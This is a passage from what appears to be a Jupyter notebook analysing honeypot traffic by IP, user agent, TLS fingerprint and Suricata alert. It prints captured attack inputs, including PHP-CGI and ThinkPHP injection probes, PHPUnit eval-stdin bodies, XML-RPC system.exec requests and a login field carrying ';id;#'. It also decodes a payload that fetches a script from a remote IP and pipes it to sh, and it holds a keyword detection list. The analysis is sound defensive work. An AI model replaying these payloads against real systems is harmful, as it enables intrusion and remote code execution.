 ('216.126.238.175', 4),
 ('104.234.115.214', 3),
 ('104.234.115.111', 3),
 ('104.234.115.183', 3),
 ('104.234.115.70', 3),
 ('104.234.115.193', 3),
 ('104.234.115.77', 3),
 ('104.234.115.26', 3),
 ('104.234.115.1', 3)]
```

</details>

<details>
<summary><strong>Cell 16</strong></summary>

**Code**

```python
ips_104 = sorted(set([e['srcIP'] for e in sus if e['srcIP'].startswith('104.234.115.')]))[:20]
ips_104, len(ips_104)
```

**Output**

```text
(['104.234.115.1',
  '104.234.115.111',
  '104.234.115.119',
  '104.234.115.150',
  '104.234.115.160',
  '104.234.115.164',
  '104.234.115.183',
  '104.234.115.188',
  '104.234.115.193',
  '104.234.115.214',
  '104.234.115.218',
  '104.234.115.26',
  '104.234.115.70',
  '104.234.115.77'],
 14)
```

</details>

<details>
<summary><strong>Cell 17</strong></summary>

**Code**

```python
def sample_by_path(substr):
    evs = [e for e in events if substr in e['request']]
    return Counter(e['srcIP'] for e in evs).most_common(10), Counter(e['userAgent'] for e in evs).most_common(5)

sample_by_path('/+CSCOE+/logon.html')
```

**Output**

```text
([('104.234.115.164', 4),
  ('104.234.115.218', 2),
  ('104.234.115.160', 2),
  ('104.234.115.214', 1),
  ('104.234.115.111', 1),
  ('104.234.115.183', 1),
  ('104.234.115.70', 1),
  ('104.234.115.193', 1),
  ('104.234.115.77', 1),
  ('104.234.115.26', 1)],
 [("'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'",
   19)])
```

</details>

<details>
<summary><strong>Cell 18</strong></summary>

**Code**

```python
Counter(e['request'] for e in events if "GenomeCrawlerd" in e['userAgent']).most_common(15)
```

**Output**

```text
[('/', 23),
 ('/index.html', 19),
 ('/+CSCOE+/logon.html', 19),
 ('/cgi-bin/login.cgi', 19),
 ('/login.jsp', 19),
 ('/doc/index.html', 19),
 ('/remote/login', 19),
 ('/manage/account/login', 18),
 ('/admin/index.html', 18),
 ('/web/', 18),
 ('/login.htm', 17),
 ('/login.html', 17),
 ('/login', 17)]
```

</details>

<details>
<summary><strong>Cell 19</strong></summary>

**Code**

```python
def ja_profile(ip):
    evs = [e for e in events if e['srcIP']==ip]
    return Counter(e.get('ja3') for e in evs).most_common(5), Counter(e.get('userAgent') for e in evs).most_common(5)

for ip in ['146.88.68.94','119.18.55.217']:
    print(ip, ja_profile(ip))
```

**Output**

```text
146.88.68.94 ([('7847ae5f34edc180191d9b5a893ca7d1', 44)], [('Custom-AsyncHttpClient', 44)])
119.18.55.217 ([('7041540a5e44ce9a1d4200c4214355aa', 44)], [('Custom-AsyncHttpClient', 44)])
```

</details>

<details>
<summary><strong>Cell 20</strong></summary>

**Code**

```python
top_attack_ips = [ip for ip,c in sus_by_ip.most_common(6)]
profiles = {ip: ja_profile(ip) for ip in top_attack_ips}
profiles
```

**Output**

```text
{'146.88.68.94': ([('7847ae5f34edc180191d9b5a893ca7d1', 44)],
  [('Custom-AsyncHttpClient', 44)]),
 '119.18.55.217': ([('7041540a5e44ce9a1d4200c4214355aa', 44)],
  [('Custom-AsyncHttpClient', 44)]),
 '124.71.231.117': ([('7041540a5e44ce9a1d4200c4214355aa', 44)],
  [('Custom-AsyncHttpClient', 44)]),
 '115.76.223.23': ([('7041540a5e44ce9a1d4200c4214355aa', 44)],
  [('Custom-AsyncHttpClient', 44)]),
 '165.231.148.50': ([('7041540a5e44ce9a1d4200c4214355aa', 44)],
  [('Custom-AsyncHttpClient', 44)]),
 '110.74.171.22': ([('7041540a5e44ce9a1d4200c4214355aa', 44)],
  [('Custom-AsyncHttpClient', 44)])}
```

</details>

<details>
<summary><strong>Cell 21</strong></summary>

**Code**

```python
Counter(e['userAgent'] for e in events if e['request'] in ['/ab2g','/ab2h']).most_common()[:5]
```

**Output**

```text
[('Mozilla/5.0 zgrab/0.x', 46)]
```

</details>

<details>
<summary><strong>Cell 22</strong></summary>

**Code**

```python
Counter(bool(e.get('http2')) for e in events)
```

**Output**

```text
Counter({False: 1177, True: 5})
```

</details>

<details>
<summary><strong>Cell 23</strong></summary>

**Code**

```python
[e for e in events if e.get('http2')]
```

**Output**

```text
[{'eventTime': '2025-08-02T19:21:34.502835913Z',
  'srcIP': '117.216.101.50',
  ...
  'listenerAddr': '0.0.0.0:8443'}]
# (5 HTTP/2 events; full content preserved above)
```

</details>

<details>
<summary><strong>Cell 24</strong></summary>

**Code**

```python
phpunit_scan = [e for e in events if 'eval-stdin.php' in e['request']]
Counter(e['srcIP'] for e in phpunit_scan).most_common(10), Counter(e['userAgent'] for e in phpunit_scan).most_common(5)
```

**Output**

```text
([('146.88.68.94', 37),
  ('119.18.55.217', 37),
  ('124.71.231.117', 37),
  ('115.76.223.23', 37),
  ('165.231.148.50', 37),
  ('110.74.171.22', 37),
  ('216.126.238.175', 2)],
 [('Custom-AsyncHttpClient', 224)])
```

</details>

<details>
<summary><strong>Cell 25</strong></summary>

**Code**

```python
env_hits = [e for e in events if e['request']=='/.env']
Counter((e['srcIP'], e['userAgent']) for e in env_hits).most_common(10)
```

**Output**

```text
[(('23.27.138.187',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36'),
  1),
 ...
 (('198.23.239.209',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36'),
  1)]
```

</details>

<details>
<summary><strong>Cell 26</strong></summary>

**Code**

```python
Counter(e['ja3'] for e in env_hits).most_common(5)
```

**Output**

```text
[('80de6e81f4d77bb5d16114d4ebfe5e30', 35),
 ('2721086155e2e6e30e32ea61f4d477a7', 1),
 ('b885946e72ad51dca6c70abc2f773506', 1)]
```

</details>

<details>
<summary><strong>Cell 27</strong></summary>

**Code**

```python
ja4_counts_env = Counter(e['ja4'] for e in env_hits)
ja4_counts_env.most_common(3), list(set((e['ja3'], e['ja4'], e['userAgent']) for e in env_hits))[:3]
```

**Output**

```text
([('t13i3713h1_91ec122131b4_97a66a8f4cb1', 35),
  ('t12i280600_b75078996b15_6b16546de802', 1),
  ('t13i1811h1_85036bcba153_b26ce05bbdd6', 1)],
 [('2721086155e2e6e30e32ea61f4d477a7',
   't12i280600_b75078996b15_6b16546de802',
   'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4'),
  ('b885946e72ad51dca6c70abc2f773506',
   't13i1811h1_85036bcba153_b26ce05bbdd6',
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'),
  ('80de6e81f4d77bb5d16114d4ebfe5e30',
   't13i3713h1_91ec122131b4_97a66a8f4cb1',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36')])
```

</details>

<details>
<summary><strong>Cell 28</strong></summary>

**Code**

```python
git_hits = [e for e in events if e['request']=='/.git/config']
Counter(e['ja3'] for e in git_hits).most_common(), Counter(e['userAgent'] for e in git_hits).most_common(3)
```

**Output**

```text
([('19e29534fd49dd27d09234e639c4057e', 6),
  ('ea4a9ae049cfc614efbb3c244abb3fc7', 4),
  ('f80d3d09f61892c5846c854dd84ac403', 1)],
 [('Mozilla/5.0 (compatible; Scanner/1.0)', 4),
  ('Mozilla/5.0 (Linux; Android 9; G8341) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36',
   1),
  ('Mozilla/4.0 (compatible; Dillo 3.0)', 1)])
```

</details>

<details>
<summary><strong>Cell 29</strong></summary>

**Code**

```python
Counter(e['srcIP'] for e in git_hits).most_common()
```

**Output**

```text
[('196.251.81.194', 4),
 ('146.70.116.179', 2),
 ('146.70.116.115', 2),
 ('196.251.114.43', 1),
 ('134.209.70.130', 1),
 ('170.64.207.0', 1)]
```

</details>

<details>
<summary><strong>Cell 30</strong></summary>

**Code**

```python
dev_meta = [e for e in events if '/developmentserver/metadatauploader' in e['request']]
len(dev_meta), Counter(e['srcIP'] for e in dev_meta), Counter(e['userAgent'] for e in dev_meta)
```

**Output**

```text
(6,
 Counter({'20.65.193.148': 1,
          '20.65.193.34': 1,
          '40.67.161.178': 1,
          '20.55.50.10': 1,
          '20.168.121.252': 1,
          '13.86.104.46': 1}),
 Counter({'Mozilla/5.0 zgrab/0.x': 6}))
```

</details>

<details>
<summary><strong>Cell 31</strong></summary>

**Code**

```python
owa = [e for e in events if 'owa/' in e['request']]
Counter(e['srcIP'] for e in owa), Counter(e['userAgent'] for e in owa)
```

**Output**

```text
(Counter({'48.217.87.78': 2,
          '44.247.233.115': 1,
          '20.169.85.114': 1,
          '45.156.130.42': 1,
          '20.98.140.180': 1,
          '20.65.193.168': 1,
          '135.237.127.54': 1,
          '20.65.193.203': 1}),
 Counter({'Mozilla/5.0 zgrab/0.x': 7,
          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36': 1,
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36': 1}))
```

</details>

<details>
<summary><strong>Cell 32</strong></summary>

**Code**

```python
import re
deny_summary = []
for e in denies:
    body = e.get('body','') or ''
    urls = re.findall(r'(https?://[^\s"\'\)]+)', body)
    ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', body)
    deny_summary.append({
        'time': e['eventTime'],
        'srcIP': e['srcIP'],
        'method': e['method'],
        'path': e['request'],
        'ua': e['userAgent'],
        'ja3': e.get('ja3'),
        'ja4': e.get('ja4'),
        'ja4h': e.get('ja4h'),
        'suri': [m['msg'] for m in e.get('suricataMatches',[])],
        'sids': [m['sid'] for m in e.get('suricataMatches',[])],
        'bodySha256': e.get('bodySha256'),
        'urls': list(set(urls)),
        'ips': list(set(ips)),
    })
len(deny_summary), deny_summary[:2]
```

**Output**

```text
(28,
 [{'time': '2025-08-02T07:12:51.601530967Z',
   'srcIP': '146.88.68.94',
   'method': 'POST',
   'path': '/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh',
   'ua': 'Custom-AsyncHttpClient',
   'ja3': '7847ae5f34edc180191d9b5a893ca7d1',
   'ja4': 't13i170900_5b57614c22b0_78e6aca7449b',
   'ja4h': 'po11nn070000_74abfbbd1cb4_000000000000_000000000000',
   'suri': ['ET WEB_SERVER /bin/sh In URI Possible Shell Command Execution Attempt',
    'ET WEB_SERVER WebShell Generic - wget http - POST'],
   'sids': ['2011465', '2016683'],
   'bodySha256': '25479e20ea8dcfd0d3d60f11cd62cf285dde59d102093a59281363b24e3d1a3a',
   'urls': ['http://66.63.187.193/sh'],
   'ips': ['66.63.187.193']},
  {'time': '2025-08-02T07:12:52.778494553Z',
   'srcIP': '146.88.68.94',
   'method': 'POST',
   'path': '/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
   'ua': 'Custom-AsyncHttpClient',
   'ja3': '7847ae5f34edc180191d9b5a893ca7d1',
   'ja4': 't13i170900_5b57614c22b0_78e6aca7449b',
   'ja4h': 'po11nn080000_9808b6933b86_000000000000_000000000000',
   'suri': ['ET WEB_SERVER PHP tags in HTTP POST',
    'ET WEB_SERVER Generic PHP Remote File Include',
    'ET WEB_SERVER Possible SQL Injection (exec) in HTTP Request Body'],
   'sids': ['2011768', '2019957', '2053461'],
   'bodySha256': '502b3fe470abee38ccba718786cdc140f009466641331eca5de77b0802866e2d',
   'urls': [],
   'ips': []}])
```

</details>

<details>
<summary><strong>Cell 33</strong></summary>

**Code**

```python
# Extract events with ThinkPHP
think = [e for e in denies if 'ThinkPHP' in " ".join(m['msg'] for m in e.get('suricataMatches',[]))]
len(think), think[0]['request']
```

**Output**

```text
(12,
 '/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello')
```

</details>

<details>
<summary><strong>Cell 34</strong></summary>

**Code**

```python
cah_ips = sorted(set(e['srcIP'] for e in events if e.get('userAgent')=='Custom-AsyncHttpClient'))
len(cah_ips), cah_ips
```

**Output**

```text
(8,
 ['110.74.171.22',
  '115.76.223.23',
  '119.18.55.217',
  '124.71.231.117',
  '139.9.176.173',
  '146.88.68.94',
  '165.231.148.50',
  '216.126.238.175'])
```

</details>

<details>
<summary><strong>Cell 35</strong></summary>

**Code**

```python
allowed = [e for e in events if e.get('action')=='allow']
bodied = [e for e in allowed if e.get('body')]
len(bodied), bodied[0]['body'][:120]
```

**Output**

```text
(264,
 '<?xml version="1.0"?>\r\n<methodCall>\r\n  <methodName>system.exec</methodName>\r\n  <params>\r\n    <param><value><string>id</s')
```

</details>

<details>
<summary><strong>Cell 36</strong></summary>

**Code**

```python
xmlrpc = [e for e in allowed if e['body'].lstrip().startswith('<?xml')]
len(xmlrpc), xmlrpc[0]['request'], xmlrpc[0]['headers']['Content-Type']
```

**Output**

```text
(2, '/WebInterface/function/', 'application/xml')
```

</details>

<details>
<summary><strong>Cell 37</strong></summary>

**Code**

```python
[(e['srcIP'], e['userAgent'], e['request'], e['body'][:200]) for e in xmlrpc]
```

**Output**

```text
[('67.217.228.220',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15',
  '/WebInterface/function/',
  '<?xml version="1.0"?>\r\n<methodCall>\r\n  <methodName>system.exec</methodName>\r\n  <params>\r\n    <param><value><string>id</string></value></param>\r\n  </params>\r\n</methodCall>\r\n'),
 ('67.217.228.220',
  'Mozilla/5.0 (Fedora; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0',
  '/WebInterface/function/',
  '<?xml version="1.0"?>\r\n<methodCall>\r\n  <methodName>file.write</methodName>\r\n  <params>\r\n    <param><value><string>pwned.txt</string></value></param>\r\n    <param><value><string>NUCLEI_HACKED</string></')]
```

</details>

<details>
<summary><strong>Cell 38</strong></summary>

**Code**

```python
[(e['ja3'], e['ja4'], e['userAgent']) for e in xmlrpc]
```

**Output**

```text
[('9b72665518dedb3531426284fdec8237',
  't13i250900_b78ed14e2fd0_e7c285222651',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15'),
 ('9b72665518dedb3531426284fdec8237',
  't13i250900_b78ed14e2fd0_e7c285222651',
  'Mozilla/5.0 (Fedora; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0')]
```

</details>

<details>
<summary><strong>Cell 39</strong></summary>

**Code**

```python
susp_body = []
for e in allowed:
    b = (e.get('body') or '').lower()
    if any(p in b for p in ['<?php', 'union select', "' or '1'='1", 'system.exec', 'file.write', 'wget http', 'curl http']):
        susp_body.append(e)
len(susp_body), [(e['srcIP'], e['request']) for e in susp_body[:5]]
```

**Output**

```text
(227,
 [('67.217.228.220', '/WebInterface/function/'),
  ('67.217.228.220', '/WebInterface/json/'),
  ('67.217.228.220', '/WebInterface/function/'),
  ('146.88.68.94', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'),
  ('146.88.68.94', '/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php')])
```

</details>

<details>
<summary><strong>Cell 40</strong></summary>

**Code**

```python
phpunit_posts = [e for e in allowed if 'eval-stdin.php' in e['request'] and e.get('body')]
len(phpunit_posts), phpunit_posts[0]['body'][:100]
```

**Output**

```text
(224, '<?php echo(md5("Hello PHPUnit"));')
```

</details>

<details>
<summary><strong>Cell 41</strong></summary>

**Code**

```python
len([e for e in allowed if e.get('userAgent')=='Custom-AsyncHttpClient'])
```

**Output**

```text
242
```

</details>

<details>
<summary><strong>Cell 42</strong></summary>

**Code**

```python
ja3_counts = Counter(e.get('ja3') for e in events)
ja3_counts.most_common(10)
```

**Output**

```text
[('efc81b7b978aafca58d30faeeaf28f9a', 242),
 ('7041540a5e44ce9a1d4200c4214355aa', 226),
 ('cba7f34191ef2379c1325641f6c6c4f4', 172),
 ('80de6e81f4d77bb5d16114d4ebfe5e30', 70),
 ('d6828e30ab66774a91a96ae93be4ae4c', 52),
 ('35fa0a83e466acbec1cfbb9016d550ab', 52),
 ('19e29534fd49dd27d09234e639c4057e', 48),
 ('7847ae5f34edc180191d9b5a893ca7d1', 44),
 ('47d7390b9f272110a0418056b344d65f', 41),
 ('02f32644e1b0655c19aaa3a2d6778b1e', 40)]
```

</details>

<details>
<summary><strong>Cell 43</strong></summary>

**Code**

```python
def ja3_to_ua(ja3hash):
    return Counter(e.get('userAgent') for e in events if e.get('ja3')==ja3hash).most_common(5)
[(h, ja3_to_ua(h)) for h,_ in ja3_counts.most_common(10)]
```

**Output**

```text
[('efc81b7b978aafca58d30faeeaf28f9a',
  [("'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'",
    242)]),
 ('7041540a5e44ce9a1d4200c4214355aa', [('Custom-AsyncHttpClient', 226)]),
 ('cba7f34191ef2379c1325641f6c6c4f4',
  [('Mozilla/5.0 zgrab/0.x', 83),
   ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36',
    52),
   ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    8),
   ('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 10.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)',
    4),
   ('Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    2)]),
 ('80de6e81f4d77bb5d16114d4ebfe5e30',
  [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36',
    70)]),
 ('d6828e30ab66774a91a96ae93be4ae4c',
  [('Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)',
    35),
   ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
    4),
   ('Mozilla/5.0 (X11; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0', 2),
   ('Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    2),
   ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.4.19',
    2)]),
 ('35fa0a83e466acbec1cfbb9016d550ab',
  [('Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)',
    39),
   ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    6),
   ('Mozilla/5.0 zgrab/0.x', 4),
   ('WanScannerBot/1.1', 2),
   ('', 1)]),
 ('19e29534fd49dd27d09234e639c4057e',
  [('Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity',
    14),
   ('curl/7.64.1', 4),
   ('', 3),
   ('Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36',
    3),
   ('Mozilla/5.0 (Linux; Android 9; ANE-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36',
    1)]),
 ('7847ae5f34edc180191d9b5a893ca7d1', [('Custom-AsyncHttpClient', 44)]),
 ('47d7390b9f272110a0418056b344d65f',
  [('Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)',
    41)]),
 ('02f32644e1b0655c19aaa3a2d6778b1e',
  [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    40)])]
```

</details>

<details>
<summary><strong>Cell 44</strong></summary>

**Code**

```python
[e for e in events if e.get('userAgent')=='' ][:3], Counter(e['request'] for e in events if e.get('userAgent')=='').most_common()
```

**Output**

```text
([{'eventTime': '2025-08-01T01:02:33.943045805Z',
  'srcIP': '206.168.34.91',
  ...
  'listenerAddr': '0.0.0.0:8888'}],
 [('/', 8)])
```

</details>

<details>
<summary><strong>Cell 45</strong></summary>

**Code**

```python
from datetime import timezone
def first_last(evs):
    ts = [parse_ts(e['eventTime']) for e in evs]
    return min(ts), max(ts)

campaignA_ips = cah_ips
campA_stats = {}
for ip in campaignA_ips:
    evs = [e for e in events if e['srcIP']==ip]
    campA_stats[ip] = {
        'count': len(evs),
        'first': str(first_last(evs)[0]),
        'last': str(first_last(evs)[1]),
        'ja3': list({e['ja3'] for e in evs}),
        'ja4': list({e['ja4'] for e in evs}),
    }
campA_stats
```

**Output**

```text
{'110.74.171.22': {'count': 44,
  'first': '2025-08-06 18:34:16.713472+00:00',
  'last': '2025-08-06 18:42:16.577875+00:00',
  'ja3': ['7041540a5e44ce9a1d4200c4214355aa'],
  'ja4': ['t13i170900_5b57614c22b0_78e6aca7449b']},
 '115.76.223.23': {'count': 44,
  'first': '2025-08-05 05:23:40.044445+00:00',
  'last': '2025-08-05 05:29:43.990581+00:00',
  'ja3': ['7041540a5e44ce9a1d4200c4214355aa'],
  'ja4': ['t13i170900_5b57614c22b0_78e6aca7449b']},
 '119.18.55.217': {'count': 44,
  'first': '2025-08-02 11:46:39.997319+00:00',
  'last': '2025-08-02 11:47:21.606631+00:00',
  'ja3': ['7041540a5e44ce9a1d4200c4214355aa'],
  'ja4': ['t13i170900_5b57614c22b0_78e6aca7449b']},
 '124.71.231.117': {'count': 44,
  'first': '2025-08-03 11:07:09.727329+00:00',
  'last': '2025-08-03 11:07:21.490485+00:00',
  'ja3': ['7041540a5e44ce9a1d4200c4214355aa'],
  'ja4': ['t13i170900_5b57614c22b0_78e6aca7449b']},
 '139.9.176.173': {'count': 2,
  'first': '2025-08-02 23:54:32.995923+00:00',
  'last': '2025-08-02 23:55:21.565925+00:00',
  'ja3': ['7041540a5e44ce9a1d4200c4214355aa'],
  'ja4': ['t13i170900_5b57614c22b0_78e6aca7449b']},
 '146.88.68.94': {'count': 44,
  'first': '2025-08-02 07:12:51.601530+00:00',
  'last': '2025-08-02 07:13:05.649665+00:00',
  'ja3': ['7847ae5f34edc180191d9b5a893ca7d1'],
  'ja4': ['t13i170900_5b57614c22b0_78e6aca7449b']},
 '165.231.148.50': {'count': 44,
  'first': '2025-08-05 21:06:09.622636+00:00',
  'last': '2025-08-05 21:08:23.410302+00:00',
  'ja3': ['7041540a5e44ce9a1d4200c4214355aa'],
  'ja4': ['t13i170900_5b57614c22b0_78e6aca7449b']},
 '216.126.238.175': {'count': 4,
  'first': '2025-08-07 06:34:02.618569+00:00',
  'last': '2025-08-07 06:34:52.268430+00:00',
  'ja3': ['7041540a5e44ce9a1d4200c4214355aa'],
  'ja4': ['t13i170900_5b57614c22b0_78e6aca7449b']}}
```

</details>

<details>
<summary><strong>Cell 46</strong></summary>

**Code**

```python
xmlrpc_stats = {
    'ip': '67.217.228.220',
    'count': len([e for e in events if e['srcIP']=='67.217.228.220']),
    'first_last': first_last([e for e in events if e['srcIP']=='67.217.228.220']),
    'ja3': list({e['ja3'] for e in events if e['srcIP']=='67.217.228.220'}),
    'ja4': list({e['ja4'] for e in events if e['srcIP']=='67.217.228.220'}),
    'paths': Counter(e['request'] for e in events if e['srcIP']=='67.217.228.220').most_common()
}
xmlrpc_stats
```

**Output**

```text
{'ip': '67.217.228.220',
 'count': 4,
 'first_last': (datetime.datetime(2025, 8, 1, 23, 10, 30, 546042, tzinfo=datetime.timezone.utc),
  datetime.datetime(2025, 8, 1, 23, 10, 44, 258280, tzinfo=datetime.timezone.utc)),
 'ja3': ['9b72665518dedb3531426284fdec8237'],
 'ja4': ['t13i250900_b78ed14e2fd0_e7c285222651'],
 'paths': [('/WebInterface/function/', 2),
  ('/WebInterface/json/', 1),
  ('/WebInterface/login/', 1)]}
```

</details>

<details>
<summary><strong>Cell 47</strong></summary>

**Code**

```python
[e for e in events if e['srcIP']=='67.217.228.220' and e['request']=='/WebInterface/json/'][0]
```

**Output**

```text
{'eventTime': '2025-08-01T23:10:35.267829735Z',
 'srcIP': '67.217.228.220',
 ...
 'listenerAddr': '0.0.0.0:8443'}
```

</details>

<details>
<summary><strong>Cell 48</strong></summary>

**Code**

```python
[e['bodySha256'] for e in events if e['srcIP']=='67.217.228.220']
```

**Output**

```text
['a4754b0f38cb76aea2a48b3afbe5c8de88c17a707daea6beda92545860319d81',
 '36c2a4a7efdbe270d5d1be237fe75a9ef94bdee7d405ea91705e771d11fd304f',
 '1d71199567659e3d4429a8634fd56dcdb32d8ee26e4b1210893c77a8b9624021',
 '8b7d9fb99f62faf8b95e0dc22cffa55517f51359a174a55d0e59d7954d1bc057']
```

</details>

<details>
<summary><strong>Cell 49</strong></summary>

**Code**

```python
[(e['request'], e['body'][:100], e['bodySha256']) for e in events if e['srcIP']=='67.217.228.220']
```

**Output**

```text
[('/WebInterface/function/',
  '<?xml version="1.0"?>\r\n<methodCall>\r\n  <methodName>system.exec</methodName>\r\n  <params>\r\n    <param>',
  'a4754b0f38cb76aea2a48b3afbe5c8de88c17a707daea6beda92545860319d81'),
 ('/WebInterface/json/',
  '{\r\n  "method": "system.exec",\r\n  "params": ["id"]\r\n}\r\n',
  '36c2a4a7efdbe270d5d1be237fe75a9ef94bdee7d405ea91705e771d11fd304f'),
 ('/WebInterface/login/',
  "username=admin';id;#&password=anything",
  '1d71199567659e3d4429a8634fd56dcdb32d8ee26e4b1210893c77a8b9624021'),
 ('/WebInterface/function/',
  '<?xml version="1.0"?>\r\n<methodCall>\r\n  <methodName>file.write</methodName>\r\n  <params>\r\n    <param><',
  '8b7d9fb99f62faf8b95e0dc22cffa55517f51359a174a55d0e59d7954d1bc057')]
```

</details>

<details>
<summary><strong>Cell 50</strong></summary>

**Code**

```python
[e for e in allowed if 'username=' in (e.get('body') or '')][:2], len([e for e in allowed if 'username=' in (e.get('body') or '')])
```

**Output**

```text
([{'eventTime': '2025-08-01T23:10:39.914351174Z',
  'srcIP': '67.217.228.220',
  ...
  'listenerAddr': '0.0.0.0:8443'}],
 1)
```

</details>

<details>
<summary><strong>Cell 51</strong></summary>

**Code**

```python
Counter(e['dstPort'] for e in events).most_common()
```

**Output**

```text
[(8443, 679),
 (8888, 197),
 (8080, 137),
 (3000, 64),
 (8000, 58),
 (4000, 45),
 (11434, 2)]
```

</details>

<details>
<summary><strong>Cell 52</strong></summary>

**Code**

```python
[e for e in events if e['dstPort']==11434][:5]
```

**Output**

```text
[{'eventTime': '2025-08-02T17:56:33.438507979Z',
  'srcIP': '164.52.24.187',
  ...
  'listenerAddr': '0.0.0.0:11434'},
 {'eventTime': '2025-08-08T04:59:46.16382322Z',
  'srcIP': '164.52.24.180',
  ...
  'listenerAddr': '0.0.0.0:11434'}]
```

</details>

<details>
<summary><strong>Cell 53</strong></summary>

**Code**

```python
import base64
payload_b64 = "WD0kKGN1cmwgaHR0cDovLzY2LjYzLjE4Ny4xOTMvc2ggfHwgd2dldCBodHRwOi8vNjYuNjMuMTg3LjE5My9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA="
base64.b64decode(payload_b64).decode()
```

**Output**

```text
'X=$(curl http://66.63.187.193/sh || wget http://66.63.187.193/sh -O-); echo "$X" | sh -s cve_2024_4577.selfrep'
```

</details>
